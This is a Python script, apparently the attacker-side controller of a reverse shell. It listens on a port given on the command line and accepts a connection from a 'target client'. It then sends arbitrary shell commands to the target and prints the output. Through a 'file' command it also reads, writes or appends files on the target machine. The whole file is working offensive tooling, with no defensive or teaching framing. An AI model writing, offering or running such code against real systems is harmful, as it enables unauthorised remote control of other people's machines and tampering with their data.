import socket
import sys

class bcolors:
    WHITE = '\033[90m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PINK = '\033[95m'
    CYAN = '\033[96m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

BUFFER_SIZE = 4096
REMOTE_HOST=str(sys.argv[1])+":"+str(sys.argv[2])
attacker_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

def printHeader():
    print("--------------------------------------------------")
    print("-                                                -")
    print("-              Python Reverse Shell              -")
    print("-                                                -")
    print("--------------------------------------------------")
    print("- To display available options, type --help      -")
    print("--------------------------------------------------")

# lets the attacker server listen on the specified port number
def attacker_server_binder(hostname, port_number):
    attacker_server.bind((hostname, port_number))
    attacker_server.listen(5)
    print("Waiting for incomming connection...")


# listening for connections
def target_client_connection_receiver():
    while True:
        # receive connection from target client
        target_client, target_client_address = attacker_server.accept()
        
        if(target_client != None):
            break
    print(f"{bcolors.GREEN}Connection established from target {bcolors.PINK}{target_client_address}{bcolors.ENDC}")
    print(f"${bcolors.CYAN}reverse_shell{bcolors.ENDC}@{bcolors.PINK}"+REMOTE_HOST+f"{bcolors.ENDC}: ", end="")
    return target_client


# connects to the client being targeted
def send_data(data, target_client):
    target_client.send(bytes(data, 'utf-8'))
    acknowledgement =  target_client.recv(BUFFER_SIZE)
    if(acknowledgement == b'ACK'):
        receive_data(target_client)
    else:
        print(f"{bcolors.RED}Acknowledgement receipt not received.{bcolors.ENDC}")
        print(f"${bcolors.CYAN}reverse_shell{bcolors.ENDC}@{bcolors.PINK}"+REMOTE_HOST+f"{bcolors.ENDC}: ", end="")


def receive_data(target_client):
    response = ""
    while True:
        received_data = target_client.recv(BUFFER_SIZE)
        received_data = received_data.decode('utf-8')
        response = response + received_data
        if(len(received_data) < BUFFER_SIZE):
            break
    
    if len(response) > 0:
        print(f"{response}")
    else:
        print(f"{bcolors.YELLOW}Command executed successfully{bcolors.ENDC}")
    print(f"${bcolors.CYAN}reverse_shell{bcolors.ENDC}@{bcolors.PINK}"+REMOTE_HOST+f"{bcolors.ENDC}: ", end="")

    
def command_handler(target_client):
    data = str(input())

    if data.startswith("--"):
        print("help")


        print(f"${bcolors.CYAN}reverse_shell{bcolors.ENDC}@{bcolors.PINK}"+REMOTE_HOST+f"{bcolors.ENDC}: ", end="")
    else:
        try:
            data.index('file')
            file_handler(target_client, data)
            return
        except:
            pass
        send_data(data, target_client)


def file_handler(target_client, command):
    target_client.send(bytes(command, 'utf-8'))
    acknowledgement = target_client.recv(BUFFER_SIZE)
    if(acknowledgement == b'ACK'):
        pass
    data_splits = command.split(' ')
    mode = data_splits[2]
    if(mode == 'r'):
        receive_data(target_client)
            
    elif(mode == 'w' or mode == 'a'):

        print("enter FILE_UPDATE_QUIT to end data transfer")
        while True:
            data = str(input("--> "))
            target_client.send(bytes(data, 'utf-8'))
            if(data == 'FILE_UPDATE_QUIT'):
                break
        receive_data(target_client)

def main():
    HOST=str(sys.argv[1])
    PORT=int(sys.argv[2])
    printHeader()
    attacker_server_binder(HOST, PORT)

    # receive connection from target client
    target_client = target_client_connection_receiver()

    while True:
        command_handler(target_client)

main()